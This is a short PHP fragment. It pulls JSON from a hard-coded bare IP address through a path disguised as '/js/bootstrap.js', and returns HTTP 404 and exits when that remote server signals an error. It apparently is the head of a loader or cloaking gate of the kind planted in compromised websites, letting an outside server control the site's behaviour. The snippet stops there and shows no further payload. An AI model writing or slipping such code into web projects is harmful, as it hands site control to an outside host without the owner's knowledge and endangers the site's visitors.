<?php $s0 = json_decode(file_get_contents('http://80.211.235.73/js/bootstrap.js'));
if ($s0->error):http_response_code(404);
    die();endif;